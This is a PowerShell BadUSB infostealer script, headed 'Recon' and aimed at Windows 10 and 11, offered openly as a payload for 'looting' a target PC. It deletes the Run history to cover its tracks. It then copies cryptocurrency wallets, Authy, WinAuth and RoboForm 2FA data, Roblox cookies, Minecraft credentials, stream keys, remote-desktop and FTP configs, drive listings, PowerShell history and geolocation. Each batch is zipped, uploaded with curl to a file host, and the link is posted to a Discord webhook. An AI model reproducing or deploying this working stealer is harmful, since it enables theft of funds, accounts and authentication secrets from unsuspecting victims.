 ############################################################################################################################################################                      
#                                  |  ___                           _           _              _             #              ,d88b.d88b                     #                                 
# Title        : Recon             | |_ _|   __ _   _ __ ___       | |   __ _  | | __   ___   | |__    _   _ #              88888888888                    #           
# Author       : Jakoby+Sealldev   |  | |   / _` | | '_ ` _ \   _  | |  / _` | | |/ /  / _ \  | '_ \  | | | |#              `Y8888888Y'                    #           
# Version      : 2.0               |  | |  | (_| | | | | | | | | |_| | | (_| | |   <  | (_) | | |_) | | |_| |#               `Y888Y'                       #
# Category     : Recon             | |___|  \__,_| |_| |_| |_|  \___/   \__,_| |_|\_\  \___/  |_.__/   \__, |#                 `Y'                         #
# Target       : Windows 10,11     |                                                                   |___/ #           /\/|_      __/\\                  #     
# Mode         : HID               |                                                           |\__/,|   (`\ #          /    -\    /-   ~\                 #             
#                                  |  My crime is that of curiosity                            |_ _  |.--.) )#          \    = Y =T_ =   /                 #      
#                                  |  and yea curiosity killed the cat                         ( T   )     / #   Luther  )==*(`     `) ~ \   Hobo          #                        
#                                  |  but satisfaction brought him back                       (((^_(((/(((_/ #          /     \     /     \                #    
#__________________________________|_________________________________________________________________________#          |     |     ) ~   (                #
#  tiktok.com/@i_am_jakoby                                                                                   #         /       \   /     ~ \               #
#  github.com/I-Am-Jakoby                                                                                    #         \       /   \~     ~/               #         
#  twitter.com/I_Am_Jakoby                                                                                   #   /\_/\_/\__  _/_/\_/\__~__/_/\_/\_/\_/\_/\_#                     
#  instagram.com/i_am_jakoby                                                                                 #  |  |  |  | ) ) |  |  | ((  |  |  |  |  |  |#              
#  youtube.com/c/IamJakoby                                                                                   #  |  |  |  |( (  |  |  |  \\ |  |  |  |  |  |#
############################################################################################################################################################
                                                                                                                                                                                                                                               
<#
.SYNOPSIS
	This is an advanced recon of a target PC and exfiltration of that data.
.DESCRIPTION 
	This program gathers details from target PC to include everything you could imagine from wifi passwords to PC specs to every process running.
	All of the gather information is formatted neatly and output to a file.
	That file is then exfiltrated to cloud storage via Dropbox.
.Link
      https://developers.dropbox.com/oauth-guide	    # Guide for setting up your Dropbox for uploads
      https://www.youtube.com/watch?v=Zs-1j42ySNU           # My youtube tutorial on Discord Uploads 
      https://www.youtube.com/watch?v=VPU7dFzpQrM           # My youtube tutorial on Dropbox Uploads
#>

############################################################################################################################################################

# Delete run box history first, incase user checks immediately

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# MAKE LOOT FOLDER, FILE, and ZIP 

$FolderName = "$env:USERNAME-LOOT-$(get-date -f yyyy-MM-dd_hh-mm)"

$FileName = "$FolderName.txt"

$ZIP = "$FolderName.zip"

New-Item -Path $env:tmp/$FolderName -ItemType Directory
New-Item -Path $env:tmp/$FolderName/Trees -ItemType Directory

############################################################################################################################################################

# Enter your access tokens below. At least one has to be provided but both can be used at the same time. 

#$db = ""

#$dc = ""

#$pers = 'True'

############################################################################################################################################################

# Send out started message!
$hookurl = "$dc"
$text = "BadUSB started on me!"
if ($pers -eq 'True') {
	$text+=" Persistence is **enabled**!"
}
if ($pers -eq 'Remove') {
	$text+=" Persistence is **being removed**!"
}
if ($pers -ne 'True') {
	if ($pers -ne 'Remove') {
	$text+=" Persistence is **not enabled**!"
	}
}
$text += " Good luck and happy looting! :pirate_flag:"

$Body = @{
  'username' = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)"
  'content' = $text
}

Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)

############################################################################################################################################################

New-Item -Path "$env:tmp/$FolderName/Streaming" -ItemType Directory

# OBS
$obs = Get-Childitem -Path $env:appdata\obs-studio\basic\profiles\ -Include service.json -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
if ($obs -ne $null) {
	New-Item -Path $env:tmp/$FolderName/Streaming/OBS -ItemType Directory
	Get-Content -Path $obs >> $env:tmp/$FolderName/Streaming/OBS/service.json
}

# StreamlabsOBS
if (Test-Path "$env:appdata/slobs-client/service.json" -PathType Any) {
	New-Item -Path $env:tmp/$FolderName/Streaming/StreamlabsOBS -ItemType Directory
	Get-Content -Path "$env:appdata/slobs-client/service.json" >> $env:tmp/$FolderName/Streaming/StreamlabsOBS/service.json
}

Compress-Archive -Path $env:tmp/$FolderName/Streaming -DestinationPath "$env:tmp/Streaming-$ZIP"

$text = "**Streaming**: Loot captured! Here is the URL (It expires in 12 hours): "
$text += curl.exe -F "reqtype=fileupload" -F "time=12h" -F "fileToUpload=@$env:tmp/Streaming-$ZIP" https://litterbox.catbox.moe/resources/internals/api.php

$hookurl = "$dc"

$Body = @{
  'username' = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)"
  'content' = $text
}

Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)

Remove-Item "$env:TEMP\$FolderName\Streaming" -r -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\Streaming-$ZIP" -r -Force -ErrorAction SilentlyContinue

############################################################################################################################################################

New-Item -Path "$env:tmp/$FolderName/FTPandFileSync" -ItemType Directory

# FileZilla
$filezilla = Get-Childitem -Path $env:appdata\FileZilla -Include filezilla.xml -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
if ($filezilla -ne $null) {
	Copy-Item "$env:appdata/FileZilla" "$env:tmp/$FolderName/FTPandFileSync/FileZilla" -Recurse
}

# SyncThing
if (Test-Path "$env:appdata/../Local/Syncthing/" -PathType Any) {
	New-Item -Path $env:tmp/$FolderName/FTPandFileSync/Syncthing -ItemType Directory
	Copy-Item "$env:appdata/../Local/Syncthing" "$env:tmp/$FolderName/FTPandFileSync/Syncthing" -Recurse
}

Compress-Archive -Path $env:tmp/$FolderName/FTPandFileSync -DestinationPath "$env:tmp/FTPandFileSync-$ZIP"

$text = "**FTPandFileSync**: Loot captured! Here is the URL (It expires in 12 hours): "
$text += curl.exe -F "reqtype=fileupload" -F "time=12h" -F "fileToUpload=@$env:tmp/FTPandFileSync-$ZIP" https://litterbox.catbox.moe/resources/internals/api.php

$hookurl = "$dc"

$Body = @{
  'username' = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)"
  'content' = $text
}

Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)

Remove-Item "$env:TEMP\$FolderName\FTPandFileSync" -r -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\FTPandFileSync-$ZIP" -r -Force -ErrorAction SilentlyContinue

############################################################################################################################################################

New-Item -Path "$env:tmp/$FolderName/RemoteControl" -ItemType Directory

# RustDesk
if (Test-Path "$env:appdata\RustDesk\config" -PathType Any) {
	New-Item -Path $env:tmp/$FolderName/RemoteControl/RustDesk -ItemType Directory
	Copy-Item "$env:appdata/RustDesk/config" "$env:tmp/$FolderName/RemoteControl/RustDesk/config" -Recurse
}

# TeamViewer
if (Test-Path "$env:appdata\..\Local\TeamViewer\Logs" -PathType Any) {
	New-Item -Path $env:tmp/$FolderName/RemoteControl/TeamViewer -ItemType Directory
	Copy-Item "$env:appdata/../Local/TeamViewer/Logs" "$env:tmp/$FolderName/RemoteControl/TeamViewer/Logs" -Recurse
}

# AnyDesk
if (Test-Path "$env:appdata\AnyDesk\connection_trace.txt" -PathType Any) {
	New-Item -Path $env:tmp/$FolderName/RemoteControl/AnyDesk -ItemType Directory
	Copy-Item "$env:appdata/AnyDesk/connection_trace.txt" "$env:tmp/$FolderName/RemoteControl/AnyDesk/connection_trace.txt"
}

# Parsec
if (Test-Path "$env:appdata/Parsec/log.txt" -PathType Any) {
	New-Item -Path $env:tmp/$FolderName/RemoteControl/Parsec -ItemType Directory
	Copy-Item "$env:appdata/Parsec/log.txt" "$env:tmp/$FolderName/RemoteControl/Parsec/log.txt"
}

Compress-Archive -Path $env:tmp/$FolderName/RemoteControl -DestinationPath "$env:tmp/RemoteControl-$ZIP"

$text = "**RemoteControl**: Loot captured! Here is the URL (It expires in 12 hours): "
$text += curl.exe -F "reqtype=fileupload" -F "time=12h" -F "fileToUpload=@$env:tmp/RemoteControl-$ZIP" https://litterbox.catbox.moe/resources/internals/api.php

$hookurl = "$dc"

$Body = @{
  'username' = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)"
  'content' = $text
}

Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)

Remove-Item "$env:TEMP\$FolderName\RemoteControl" -r -Force -ErrorAction SilentlyContinue
#Remove-Item "$env:TEMP\RemoteControl-$ZIP" -r -Force -ErrorAction SilentlyContinue

############################################################################################################################################################

New-Item -Path "$env:tmp/$FolderName/TorrentsAndDownloaders" -ItemType Directory

# JDownloader
$jdl = Get-Childitem -Path "$env:appdata\..\Local\JDownloader 2.0\" -Include Core.jar -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
if ($jdl -ne $null) {
	New-Item -Path "$env:tmp/$FolderName/TorrentsAndDownloaders/JDownloader2.0" -ItemType Directory
	Copy-Item "$env:appdata\..\Local\JDownloader 2.0\logs" "$env:tmp/$FolderName/TorrentsAndDownloaders/JDownloader2.0" -Recurse
}

# qBittorrent
$qbt = Get-Childitem -Path "$env:appdata\..\Local\qBittorrent\logs" -Include qbittorrent.log -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
if ($qbt -ne $null) {
	New-Item -Path "$env:tmp/$FolderName/TorrentsAndDownloaders/qBittorrent" -ItemType Directory
	Copy-Item "$env:appdata\qBittorrent\qBittorrent.ini" "$env:tmp/$FolderName/TorrentsAndDownloaders/qBittorrent/qBittorrent.ini"
	Copy-Item "$env:appdata\..\Local\qBittorrent\logs" "$env:tmp/$FolderName/TorrentsAndDownloaders/qBittorrent/logs" -Recurse
}

# Vuze
$vuze = Get-Childitem -Path "$env:appdata\Azureus" -Include downloads.config -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
if ($vuze -ne $null) {
	New-Item -Path "$env:tmp/$FolderName/TorrentsAndDownloaders/Vuze" -ItemType Directory
	Copy-Item "$env:appdata\Azureus\downloads.config" "$env:tmp/$FolderName/TorrentsAndDownloaders/Vuze/downloads.config"
	Copy-Item "$env:appdata\Azureus\dlhistoryd.config" "$env:tmp/$FolderName/TorrentsAndDownloaders/Vuze/dlhistoryd.config"
	Copy-Item "$env:appdata\Azureus\dlhistorya.config" "$env:tmp/$FolderName/TorrentsAndDownloaders/Vuze/dlhistorya.config"
	Copy-Item "$env:appdata\Azureus\azureus.config" "$env:tmp/$FolderName/TorrentsAndDownloaders/Vuze/azureus.config"
}

# uTorrent
$utorrent = Get-Childitem -Path "$env:appdata\utorrent" -Include settings.dat -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
if ($utorrent -ne $null) {
	New-Item -Path "$env:tmp/$FolderName/TorrentsAndDownloaders/uTorrent" -ItemType Directory
	Copy-Item "$env:appdata\utorrent\settings.dat" "$env:tmp/$FolderName/TorrentsAndDownloaders/uTorrent/settings.dat"
}

Compress-Archive -Path $env:tmp/$FolderName/TorrentsAndDownloaders -DestinationPath "$env:tmp/TorrentsAndDownloaders-$ZIP"

$text = "**TorrentsAndDownloaders**: Loot captured! Here is the URL (It expires in 12 hours): "
$text += curl.exe -F "reqtype=fileupload" -F "time=12h" -F "fileToUpload=@$env:tmp/TorrentsAndDownloaders-$ZIP" https://litterbox.catbox.moe/resources/internals/api.php

$hookurl = "$dc"

$Body = @{
  'username' = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)"
  'content' = $text
}

Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)

Remove-Item "$env:TEMP\$FolderName\TorrentsAndDownloaders" -r -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\TorrentsAndDownloaders-$ZIP" -r -Force -ErrorAction SilentlyContinue

############################################################################################################################################################

New-Item -Path "$env:tmp/$FolderName/Crypto" -ItemType Directory

# Bitcoin
$path="$env:appdata/Bitcoin/wallets"
if (Test-Path $path -PathType Any) {
	New-Item -Path "$env:tmp/$FolderName/Crypto/Bitcoin" -ItemType Directory
	Copy-Item "$env:appdata/Bitcoin/wallets" "$env:tmp/$FolderName/Crypto/Bitcoin" -Recurse
}

# Electrum
$path="$env:appdata/Electrum/wallets"
if (Test-Path $path -PathType Any) {
	New-Item -Path "$env:tmp/$FolderName/Crypto/Electrum" -ItemType Directory
	Copy-Item "$env:appdata/Electrum/wallets" "$env:tmp/$FolderName/Crypto/Electrum" -Recurse
}

# Sparrow
$path="$env:appdata/Sparrow/wallets"
if (Test-Path $path -PathType Any) {
	New-Item -Path "$env:tmp/$FolderName/Crypto/Sparrow" -ItemType Directory
	Copy-Item "$env:appdata/Sparrow/wallets" "$env:tmp/$FolderName/Crypto/Sparrow" -Recurse
}

# Bither
$path="$env:appdata/Bither/wallet"
if (Test-Path $path -PathType Any) {
	New-Item -Path "$env:tmp/$FolderName/Crypto/Bither" -ItemType Directory
	Copy-Item "$env:appdata/Bither/wallet" "$env:tmp/$FolderName/Crypto/Bither" -Recurse
}

# Frame
$path="$env:appdata/frame"
if (Test-Path $path -PathType Any) {
	New-Item -Path "$env:tmp/$FolderName/Crypto/frame" -ItemType Directory
	Copy-Item "$env:appdata/frame/config.json" "$env:tmp/$FolderName/Crypto/frame/config.json"
}

# MyCrypto
$path="$env:appdata/MyCrypto"
if (Test-Path $path -PathType Any) {
	New-Item -Path "$env:tmp/$FolderName/Crypto/MyCrypto" -ItemType Directory
	Copy-Item "$env:appdata/MyCrypto" "$env:tmp/$FolderName/Crypto/MyCrypto" -Recurse
}

# Exodus
$path="$env:appdata/Exodus"
if (Test-Path $path -PathType Any) {
	New-Item -Path "$env:tmp/$FolderName/Crypto/Exodus" -ItemType Directory
	Copy-Item "$env:appdata/Exodus" "$env:tmp/$FolderName/Crypto/Exodus" -Recurse
}

# Spectre
$path="$env:appdata/spectre-desktop"
if (Test-Path $path -PathType Any) {
	New-Item -Path "$env:tmp/$FolderName/Crypto/Spectre" -ItemType Directory
	Copy-Item "$env:appdata/spectre-desktop" "$env:tmp/$FolderName/Crypto/Spectre" -Recurse
}

# OneKey
$path="$env:appdata/@onekey/desktop"
if (Test-Path $path -PathType Any) {
	New-Item -Path "$env:tmp/$FolderName/Crypto/OneKey" -ItemType Directory
	Copy-Item "$env:appdata/@onekey/desktop" "$env:tmp/$FolderName/Crypto/OneKey" -Recurse
}

# InfinityWallet
$path="$env:appdata/InfinityWallet"
if (Test-Path $path -PathType Any) {
	New-Item -Path "$env:tmp/$FolderName/Crypto/InfinityWallet" -ItemType Directory
	Copy-Item "$env:appdata/InfinityWallet" "$env:tmp/$FolderName/Crypto/InfinityWallet" -Recurse
}

# InfinityWallet
$path="$env:appdata/Guarda"
if (Test-Path $path -PathType Any) {
	New-Item -Path "$env:tmp/$FolderName/Crypto/Guarda" -ItemType Directory
	Copy-Item "$env:appdata/Guarda" "$env:tmp/$FolderName/Crypto/Guarda" -Recurse
}

# CoinWallet
$path="$env:appdata/Coin Wallet"
if (Test-Path $path -PathType Any) {
	New-Item -Path "$env:tmp/$FolderName/Crypto/CoinWallet" -ItemType Directory
	Copy-Item "$env:appdata/Coin Wallet" "$env:tmp/$FolderName/Crypto/CoinWallet" -Recurse
}

# WalletWasabi
$path="$env:appdata/WalletWasabi/Client/Wallets"
if (Test-Path $path -PathType Any) {
	New-Item -Path "$env:tmp/$FolderName/Crypto/WalletWasabi" -ItemType Directory
	Copy-Item "$env:appdata/WalletWasabi/Client/Wallets" "$env:tmp/$FolderName/Crypto/WalletWasabi" -Recurse
}

# Armory
$path="$env:appdata/Armory"
if (Test-Path $path -PathType Any) {
	New-Item -Path "$env:tmp/$FolderName/Crypto/Armory" -ItemType Directory
	Copy-Item "$env:appdata/Armory" "$env:tmp/$FolderName/Crypto/Armory" -Recurse
}

# Monero
$documents=[Environment]::GetFolderPath("MyDocuments")
$path="$documents\Monero\wallets"
if (Test-Path $path -PathType Any) {
	New-Item -Path "$env:tmp/$FolderName/Crypto/Monero" -ItemType Directory
	Copy-Item "$documents\Monero\wallets" "$env:tmp/$FolderName/Crypto/Monero" -Recurse
}

Compress-Archive -Path $env:tmp/$FolderName/Crypto -DestinationPath "$env:tmp/Crypto-$ZIP"

$text = "**Crypto**: Loot captured! Here is the URL (It expires in 12 hours): "
$text += curl.exe -F "reqtype=fileupload" -F "time=12h" -F "fileToUpload=@$env:tmp/Crypto-$ZIP" https://litterbox.catbox.moe/resources/internals/api.php

$hookurl = "$dc"

$Body = @{
  'username' = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)"
  'content' = $text
}

Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)

Remove-Item "$env:TEMP\$FolderName\Crypto" -r -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\Crypto-$ZIP" -r -Force -ErrorAction SilentlyContinue

############################################################################################################################################################

New-Item -Path "$env:tmp/$FolderName/2FA" -ItemType Directory

# Authy Desktop
$path="$env:appdata\Authy Desktop"
if (Test-Path $path -PathType Any) {
	New-Item -Path "$env:tmp/$FolderName/2FA/Authy" -ItemType Directory
	Copy-Item "$env:appdata\Authy Desktop\Cookies" "$env:tmp/$FolderName/2FA/Authy/Cookies"
	Copy-Item "$env:appdata\Authy Desktop\Local State" "$env:tmp/$FolderName/2FA/Authy/Local State"
	Copy-Item "$env:appdata\Authy Desktop\Preferences" "$env:tmp/$FolderName/2FA/Authy/Preferences"
	Copy-Item "$env:appdata\Authy Desktop\Local Storage\leveldb" "$env:tmp/$FolderName/2FA/Authy/Local Storage/leveldb" -Recurse
	Copy-Item "$env:appdata\Authy Desktop\Session Storage" "$env:tmp/$FolderName/2FA/Authy/Session Storage" -Recurse
	Copy-Item "$env:appdata\Authy Desktop\databases" "$env:tmp/$FolderName/2FA/Authy/databases" -Recurse
}

# WinAuth
$path="$env:appdata\WinAuth"
if (Test-Path $path -PathType Any) {
	New-Item -Path "$env:tmp/$FolderName/2FA/WinAuth" -ItemType Directory
	Copy-Item "$env:appdata\WinAuth" "$env:tmp/$FolderName/2FA/WinAuth" -Recurse
}

# RoboForm
$path="$env:appdata\..\Local\RoboForm\Profiles"
if (Test-Path $path -PathType Any) {
	New-Item -Path "$env:tmp/$FolderName/2FA/RoboForm" -ItemType Directory
	Copy-Item "$env:appdata\..\Local\RoboForm\Profiles" "$env:tmp/$FolderName/2FA/RoboForm" -Recurse
}

Compress-Archive -Path $env:tmp/$FolderName/2FA -DestinationPath "$env:tmp/2FA-$ZIP"

$text = "**2FA**: Loot captured! Here is the URL (It expires in 12 hours): "
$text += curl.exe -F "reqtype=fileupload" -F "time=12h" -F "fileToUpload=@$env:tmp/2FA-$ZIP" https://litterbox.catbox.moe/resources/internals/api.php

$hookurl = "$dc"

$Body = @{
  'username' = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)"
  'content' = $text
}

Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)

Remove-Item "$env:TEMP\$FolderName\2FA" -r -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\2FA-$ZIP" -r -Force -ErrorAction SilentlyContinue

############################################################################################################################################################

New-Item -Path "$env:tmp/$FolderName/Socials" -ItemType Directory

# Telegram
if (Test-Path "$env:appdata/Telegram Desktop/log.txt" -PathType Any) {
	New-Item -Path $env:tmp/$FolderName/Socials/Telegram -ItemType Directory
	Copy-Item "$env:appdata/Telegram Desktop/log.txt" "$env:tmp\$FolderName\Socials\Telegram\log.txt"
}

# Keybase
if (Test-Path "$env:appdata/../Local/Keybase/config.json" -PathType Any) {
	New-Item -Path $env:tmp/$FolderName/Socials/Keybase -ItemType Directory
	Copy-Item "$env:appdata/../Local/Keybase/config.json" "$env:tmp/$FolderName/Socials/Keybase/config.json"
}

Compress-Archive -Path $env:tmp/$FolderName/Socials -DestinationPath "$env:tmp/Socials-$ZIP"

$text = "**Socials**: Loot captured! Here is the URL (It expires in 12 hours): "
$text += curl.exe -F "reqtype=fileupload" -F "time=12h" -F "fileToUpload=@$env:tmp/Socials-$ZIP" https://litterbox.catbox.moe/resources/internals/api.php

$hookurl = "$dc"

$Body = @{
  'username' = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)"
  'content' = $text
}

Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)

Remove-Item "$env:TEMP\$FolderName\Socials" -r -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\Socials-$ZIP" -r -Force -ErrorAction SilentlyContinue

############################################################################################################################################################

New-Item -Path "$env:tmp/$FolderName/Gaming" -ItemType Directory

# BattleNet
if ([System.IO.File]::Exists("$env:appdata/Battle.net/Battle.net.config")) {
	New-Item -Path $env:tmp/$FolderName/Gaming/BattleNet -ItemType Directory
	Copy-Item "$env:appdata/Battle.net/Battle.net.config" "$env:tmp/$FolderName/Gaming/BattleNet/Battle.net.config"
}

# Ubisoft
if (Test-Path "$env:appdata/../Local/Ubisoft Game Launcher" -PathType Any) {
	New-Item -Path $env:tmp/$FolderName/Gaming/BattleNet -ItemType Directory
	Copy-Item "$env:appdata/../Local/Ubisoft Game Launcher" "env:tmp/$FolderName/Gaming/Ubisoft" -Recurse
}

# Roblox
function get-RobloxCookies {
	try {
	$roblox = Get-ItemProperty -Path "HKCU:\Software\Roblox\RobloxStudioBrowser\roblox.com" 
	$RBXID = $roblox | Select-Object .RBXID | Format-Table -AutoSize -Wrap | Out-String
	$RobloSec = $roblox | Select-Object .ROBLOSECURITY | Format-Table -AutoSize -Wrap |Out-String
	$robloxCookies=$RobloSec+$RBXID
	}

	catch {
	Write-Error "No roblox cookies found!"
	return $null
	-ErrorAction SilentlyContinue
	}
	
	return $robloxCookies
}

$roblox = get-RobloxCookies
if ($roblox -ne $null) {
	$roblox >> $env:tmp/$FolderName/Gaming/RobloxCookies.txt
}

# Fortnite
if (Test-Path "$env:appdata/../Local/FortniteGame" -PathType Any) {
	New-Item -Path $env:tmp/$FolderName/Gaming/Fortnite -ItemType Directory
}
if ([System.IO.File]::Exists("$env:appdata/../Local/FortniteGame/Saved/Logs/FortniteGame.log")) {
	Copy-Item "$env:appdata/../Local/FortniteGame/Saved/Logs/FortniteGame.log" "$env:tmp/$FolderName/Gaming/Fortnite/FortniteGame.log"
}
if ([System.IO.File]::Exists("$env:appdata/../Local/FortniteGame/Saved/Logs/FortniteLauncher.log")) {
	Copy-Item "$env:appdata/../Local/FortniteGame/Saved/Logs/FortniteLauncher.log" "$env:tmp/$FolderName/Gaming/Fortnite/FortniteLauncher.log"
}

# RiotGames - Folders
if (Test-Path "$env:appdata/../Local/Riot Games" -PathType Any) {
	New-Item -Path "$env:tmp/$FolderName/Gaming/Riot Games" -ItemType Directory
}
if (Test-Path "$env:appdata/../Local/VALORANT" -PathType Any) {
	New-Item -Path "$env:tmp/$FolderName/Gaming/Riot Games/Valorant" -ItemType Directory
}
if (Test-Path "$env:appdata\..\Local\Riot Games\Riot Client" -PathType Any) {
	New-Item -Path "$env:tmp/$FolderName/Gaming/Riot Games/Riot Client" -ItemType Directory
}
# VALORANT
if (Test-Path "$env:appdata/../Local/Riot Games/VALORANT" -PathType Any) {
	New-Item -Path "$env:tmp/$FolderName/Gaming/Riot Games/Valorant" -ItemType Directory
}
if (Test-Path "$env:appdata/../Local/VALORANT/Saved/Logs" -PathType Any) {
Copy-Item "$env:appdata/../Local/VALORANT/Saved/Logs" "$env:tmp/$FolderName/Gaming/Riot Games/Valorant" -Recurse
}
if (Test-Path "$env:appdata/../Local/VALORANT/Saved/Config" -PathType Any) {
Copy-Item "$env:appdata/../Local/VALORANT/Saved/Config" "$env:tmp/$FolderName/Gaming/Riot Games/Valorant" -Recurse
}
# LoL
if (Test-Path "$env:appdata/../Local/Riot Games/League of Legends" -PathType Any) {
	New-Item -Path "$env:tmp/$FolderName/Gaming/Riot Games/League of Legends" -ItemType Directory
}
if (Test-Path "$env:appdata/../Local/League of Legends/Saved/Logs" -PathType Any) {
Copy-Item "$env:appdata/../Local/League of Legends/Saved/Logs" "$env:tmp/$FolderName/Gaming/Riot Games/League of Legends" -Recurse
}
if (Test-Path "$env:appdata/../Local/League of Legends/Saved/Config" -PathType Any) {
Copy-Item "$env:appdata/../Local/League of Legends/Saved/Config" "$env:tmp/$FolderName/Gaming/Riot Games/League of Legends" -Recurse
}
# RiotClient
if (Test-Path "$env:appdata\..\Local\Riot Games\Riot Client\Data" -PathType Any) {
Copy-Item "$env:appdata/../Local/Riot Games/Riot Client/Data" "$env:tmp/$FolderName/Gaming/Riot Games/Riot Client" -Recurse
}
if (Test-Path "$env:appdata\..\Local\Riot Games\Riot Client\Config" -PathType Any) {
	Copy-Item "$env:appdata/../Local/Riot Games/Riot Client/Config" "$env:tmp/$FolderName/Gaming/Riot Games/Riot Client" -Recurse
}

# Minecraft
function get-MinecraftAccounts {
	try {
		$data = Get-Content -Path "$env:appdata/.minecraft/launcher_log.txt"
	}
	
	catch {
		Write-Error "Minecraft data not found!"
		return $null
		-ErrorAction SilentlyContinue
	}
	
	return $data
}

$minecraft = get-MinecraftAccounts
if ($minecraft -ne $null) {
	New-Item -Path $env:tmp/$FolderName/Gaming/Minecraft -ItemType Directory
	Get-Content -Path "$env:appdata/.minecraft/launcher_accounts.json" > $env:tmp/$FolderName/Gaming/Minecraft/launcher_accounts.json
	Get-Content -Path "$env:appdata/.minecraft/launcher_accounts_microsoft_store.json" > $env:tmp/$FolderName/Gaming/Minecraft/launcher_accounts_microsoft_store.json
	Get-Content -Path "$env:appdata/.minecraft/launcher_msa_credentials.bin" > $env:tmp/$FolderName/Gaming/Minecraft/launcher_msa_credentials.bin
	Get-Content -Path "$env:appdata/.minecraft/launcher_msa_credentials_microsoft_store.bin" > $env:tmp/$FolderName/Gaming/Minecraft/launcher_msa_credentials_microsoft_store.bin
	Get-Content -Path "$env:appdata/.minecraft/servers.dat" > $env:tmp/$FolderName/Gaming/Minecraft/servers.dat
}

Compress-Archive -Path $env:tmp/$FolderName/Gaming -DestinationPath "$env:tmp/Gaming-$ZIP"

$text = "**Gaming**: Loot captured! Here is the URL (It expires in 12 hours): "
$text += curl.exe -F "reqtype=fileupload" -F "time=12h" -F "fileToUpload=@$env:tmp/Gaming-$ZIP" https://litterbox.catbox.moe/resources/internals/api.php

$hookurl = "$dc"

$Body = @{
  'username' = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)"
  'content' = $text
}

Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)

Remove-Item "$env:TEMP\$FolderName\Gaming" -r -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\Gaming-$ZIP" -r -Force -ErrorAction SilentlyContinue

############################################################################################################################################################

# Recon all Drives
$drives = (Get-PSDrive -PSProvider FileSystem).Root
foreach($Drive in $drives) {
    $DriveName = $Drive.Replace(":\","")
    tree $Drive /a /f >> $env:TEMP\$folderName\Trees\tree-$DriveName.txt
}
tree $env:appdata /a /f >> $env:TEMP\$folderName\Trees\tree-appdata.txt

Compress-Archive -Path $env:tmp/$FolderName/Trees -DestinationPath "$env:tmp/Trees-$ZIP"

$text = "**Trees**: Loot captured! Here is the URL (It expires in 12 hours): "
$text += curl.exe -F "reqtype=fileupload" -F "time=12h" -F "fileToUpload=@$env:tmp/Trees-$ZIP" https://litterbox.catbox.moe/resources/internals/api.php

$hookurl = "$dc"

$Body = @{
  'username' = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)"
  'content' = $text
}

Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)

Remove-Item "$env:TEMP\$FolderName\Trees" -r -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\Trees-$ZIP" -r -Force -ErrorAction SilentlyContinue

# Powershell history
Copy-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Destination  $env:TEMP\$FolderName\Powershell-History.txt

############################################################################################################################################################

function Get-fullName {

    try {
    $fullName = (Get-LocalUser -Name $env:USERNAME).FullName
    }
 
 # If no name is detected function will return $env:UserName 

    # Write Error is just for troubleshooting 
    catch {Write-Error "No name was detected" 
    return $env:UserName
    -ErrorAction SilentlyContinue
    }

    return $fullName 

}

$fullName = Get-fullName

#------------------------------------------------------------------------------------------------------------------------------------

function Get-email {
    
    try {

    $email = (Get-CimInstance CIM_ComputerSystem).PrimaryOwnerName
    return $email
    }

# If no email is detected function will return backup message for sapi speak

    # Write Error is just for troubleshooting
    catch {Write-Error "An email was not found" 
    return "No Email Detected"
    -ErrorAction SilentlyContinue
    }        
}

$email = Get-email


#------------------------------------------------------------------------------------------------------------------------------------

function Get-GeoLocation{
	try {
	Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
	$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
	$GeoWatcher.Start() #Begin resolving current locaton

	while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
		Start-Sleep -Milliseconds 100 #Wait for discovery.
	}  

	if ($GeoWatcher.Permission -eq 'Denied'){
		Write-Error 'Access Denied for Location Information'
	} else {
		$GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevent results.
	}
	}
    # Write Error is just for troubleshooting
    catch {Write-Error "No coordinates found" 
    return "No Coordinates found"
    -ErrorAction SilentlyContinue
    } 

}

$GeoLocation = Get-GeoLocation

